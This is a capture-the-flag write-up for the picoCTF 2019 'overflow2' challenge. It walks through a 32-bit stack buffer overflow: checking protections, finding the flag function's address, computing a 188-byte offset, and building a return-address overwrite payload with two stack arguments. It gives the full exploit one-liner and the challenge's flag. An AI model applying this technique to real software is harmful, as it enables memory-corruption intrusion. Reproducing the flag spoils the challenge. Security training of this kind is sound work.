# overflow2

Simple overflow problem, only need to control return address, and jump to function flag in binary, which can open flag.txt, and pass two arguments to function flag. 

Check security of the binary:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, we can find address of the function flag.
```
0x080485e6 flag
```
We can find buffer length by looking the function vuln:
```
...
0x08048662 <+3>:	push   ebx
0x08048663 <+4>:	sub    esp,0xb4
...
```
We found that in function vuln, stack first push the ebx into stack and sub length 180 as the buffer. Therefore, the length of the payload will be 4 bytes(ebx) + 180 bytes(buffer) + 4 bytes(ebp) = 188 bytes.

The payload will be:
```
'A'*188 + '\xe6\x85\x04\x08'
``` 
Next, we need to push two arguments 0xdeadbeef, 0xc0ded00d into the stack, because the function will get argument from stack[+4](stack[+0] is return address), we need add 4 bytes offset, the payload will be:
```
'A'*4 + '\xef\xbe\xad\xde' + '\x0d\xd0\xde\xc0'
```
The whole payload will be:
```
'A'*188 + '\xe6\x85\x04\x08' + 'A'*4 + '\xef\xbe\xad\xde' + '\x0d\xd0\xde\xc0'
```
ssh to the 2019shell1.picoctf.com, and execute command:
```
cd /problems/overflow-2_2_47d6bbdfb1ccd0d65a76e6cbe0935b0f
python2 -c "print 'A'*188 + '\xe6\x85\x04\x08' + 'A'*4 + '\xef\xbe\xad\xde' + '\x0d\xd0\xde\xc0'" | ./vuln
```
obtain the flag:
```
picoCTF{arg5_and_r3turn5ce5cf61a}
```

